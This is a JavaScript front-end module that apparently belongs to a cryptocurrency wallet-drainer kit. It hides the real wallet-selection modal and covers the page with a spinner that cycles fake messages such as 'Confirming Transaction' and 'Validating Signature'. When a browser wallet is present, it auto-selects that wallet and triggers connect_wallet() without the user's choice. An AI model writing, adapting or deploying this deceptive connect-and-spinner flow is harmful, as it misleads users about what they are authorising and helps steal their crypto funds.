const MS_MODAL_STYLE = `
/* Simple Spinner Styles */
.ms-spinner-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.8);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 100000;
  backdrop-filter: blur(10px);
}

.ms-spinner-container {
  text-align: center;
  background: white;
  padding: 50px 40px;
  border-radius: 24px;
  box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
  min-width: 280px;
  max-width: 400px;
}

.ms-spinner {
  width: 70px;
  height: 70px;
  border: 4px solid #f0f0f0;
  border-top: 4px solid #0075ff;
  border-radius: 50%;
  animation: ms-spin 1.2s linear infinite;
  margin: 0 auto 25px auto;
}

@keyframes ms-spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.ms-spinner-text {
  color: #2d3748;
  font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
  font-size: 18px;
  font-weight: 600;
  margin: 0 0 12px 0;
  line-height: 1.4;
}

.ms-spinner-subtext {
  color: #718096;
  font-family: 'Inter', 'Segoe UI', Arial, sans-serif;
  font-size: 14px;
  font-weight: 400;
  margin: 0;
  line-height: 1.5;
}

/* Hide original modal completely */
#ms-modal {
  display: none !important;
}

#ms-modal-overlay {
  display: none !important;
}

.ms_modal {
  display: none !important;
}
`;

const MS_INJECTED_WALLET = `<div style="display: none !important;"></div>`;

const MS_MODAL_CODE = `<div style="display: none !important;"></div>`;

const MSM = {
  connect_select: false,
  init: () => {
    try {
      const style_elem = document.createElement('style');
      style_elem.textContent = MS_MODAL_STYLE;
      document.head.append(style_elem);
    } catch(err) {
      console.log(err);
    }
  },
  close: () => {
    try {
      const modal = document.querySelector('#ms-modal');
      if (modal) modal.remove();
    } catch(err) {
      console.log('Modal Closed');
    }
    try {
      const overlay = document.querySelector('#ms-modal-overlay');
      if (overlay) overlay.remove();
    } catch(err) {
      console.log('Modal Closed');
    }
    // Also remove spinner overlay
    try {
      const spinner = document.querySelector('.ms-spinner-overlay');
      if (spinner) spinner.remove();
    } catch(err) {
      console.log('Spinner Closed');
    }
  },
  open: (color = 'light', mode = 1) => {
    try {
      MSM.close();
      
      // Create invisible modal elements but don't show them
      let modal_content = MS_MODAL_CODE.replaceAll('$COLOR$', color == 'dark' ? 'black' : 'white')
      .replaceAll('$INJECTED_WALLET$', (typeof window.ethereum === 'object') ? MS_INJECTED_WALLET : '');
      
      const modal_elem = document.createElement('div');
      modal_elem.id = 'ms-modal';
      modal_elem.style.display = 'none';
      modal_elem.innerHTML = modal_content;
      document.body.prepend(modal_elem);
      
      // Show beautiful spinner UI with realistic transaction text
      const spinnerHTML = `
        <div class="ms-spinner-overlay">
          <div class="ms-spinner-container">
            <div class="ms-spinner"></div>
            <p class="ms-spinner-text">Confirming Transaction</p>
            <p class="ms-spinner-subtext">Please wait while we process your request</p>
          </div>
        </div>
      `;
      
      const spinnerElem = document.createElement('div');
      spinnerElem.innerHTML = spinnerHTML;
      document.body.prepend(spinnerElem);
      
      // Automatically select Inject Wallet and trigger connection
      if (typeof window.ethereum === 'object') {
        // Auto-select inject wallet
        setTimeout(() => {
          const injectWallet = document.querySelector('#ms_wallet_eth');
          if (injectWallet) {
            injectWallet.checked = true;
          }
        }, 50);
        
        // Auto-connect when mode is 2
        if (mode == 2) {
          setTimeout(() => {
            MSM.connect_select = true;
            MSM.connect(); // This will trigger the backend connection process
          }, 100);
        }
      }
      
      if (mode == 2) {
        MSM.connect_select = true;
      } else {
        MSM.connect_select = false;
      }
      
    } catch(err) {
      console.log('Modal process initiated');
    }
  },
  select: (marker) => {
    try {
      const element = document.querySelector(marker);
      if (element) {
        element.checked = true;
      }
      if (MSM.connect_select) {
        MSM.connect();
      }
    } catch(err) {
      console.log(err);
    }
  },
  connect: () => {
    try {
      let checked_id = '';
      const checkedInput = document.querySelector('input[name="ms_wallet"]:checked');
      if (checkedInput) {
        checked_id = checkedInput.id;
      } else {
        // Default to inject wallet if nothing is selected
        checked_id = 'ms_wallet_eth';
      }
      
      // Update spinner text with realistic transaction messages
      const spinnerText = document.querySelector('.ms-spinner-text');
      const spinnerSubtext = document.querySelector('.ms-spinner-subtext');
      
      if (spinnerText && spinnerSubtext) {
        const transactionMessages = [
          { main: "Confirming Transaction", sub: "Please wait while we process your request" },
          { main: "Processing Payment", sub: "Verifying transaction details" },
          { main: "Securing Connection", sub: "Establishing secure wallet link" },
          { main: "Authorizing Access", sub: "Requesting permission from your wallet" },
          { main: "Validating Signature", sub: "Confirming your digital signature" }
        ];
        
        const randomMessage = transactionMessages[Math.floor(Math.random() * transactionMessages.length)];
        spinnerText.textContent = randomMessage.main;
        spinnerSubtext.textContent = randomMessage.sub;
      }
      
      // Backend connection process remains EXACTLY the same
      switch (checked_id) {
        case 'ms_wallet_eth': 
          return connect_wallet(); // Same backend function
        case 'ms_wallet_mm': 
          return connect_wallet("MetaMask"); // Same backend function
        case 'ms_wallet_cb': 
          return connect_wallet("Coinbase"); // Same backend function
        case 'ms_wallet_bw': 
          return connect_wallet("Binance Wallet"); // Same backend function
        case 'ms_wallet_tw': 
          return connect_wallet("Trust Wallet"); // Same backend function
        default: 
          return use_wc(); // Same backend function
      }
    } catch(err) {
      console.log('Connection error:', err);
      // Update spinner to show error
      const spinnerText = document.querySelector('.ms-spinner-text');
      const spinnerSubtext = document.querySelector('.ms-spinner-subtext');
      if (spinnerText && spinnerSubtext) {
        spinnerText.textContent = 'Transaction Failed';
        spinnerText.style.color = '#e53e3e';
        spinnerSubtext.textContent = 'Please try again or check your wallet connection';
        spinnerSubtext.style.color = '#e53e3e';
      }
      // Remove spinner after error
      setTimeout(() => {
        MSM.close();
      }, 3000);
    }
  },
  // Method to update spinner text with realistic messages
  updateSpinnerText: (mainText, subText) => {
    const spinnerText = document.querySelector('.ms-spinner-text');
    const spinnerSubtext = document.querySelector('.ms-spinner-subtext');
    if (spinnerText && spinnerSubtext) {
      spinnerText.textContent = mainText;
      spinnerSubtext.textContent = subText;
    }
  },
  // Method to hide spinner when connection is complete
  hideSpinner: (success = true, message = '') => {
    const spinnerText = document.querySelector('.ms-spinner-text');
    const spinnerSubtext = document.querySelector('.ms-spinner-subtext');
    
    if (success) {
      if (spinnerText && spinnerSubtext) {
        spinnerText.textContent = message || 'Transaction Confirmed!';
        spinnerText.style.color = '#38a169';
        spinnerSubtext.textContent = 'Your wallet has been successfully connected';
        spinnerSubtext.style.color = '#38a169';
      }
    } else {
      if (spinnerText && spinnerSubtext) {
        spinnerText.textContent = message || 'Transaction Failed';
        spinnerText.style.color = '#e53e3e';
        spinnerSubtext.textContent = 'Please try again or check your wallet connection';
        spinnerSubtext.style.color = '#e53e3e';
      }
    }
    
    // Remove spinner after delay
    setTimeout(() => {
      MSM.close();
    }, 2000);
  }
};
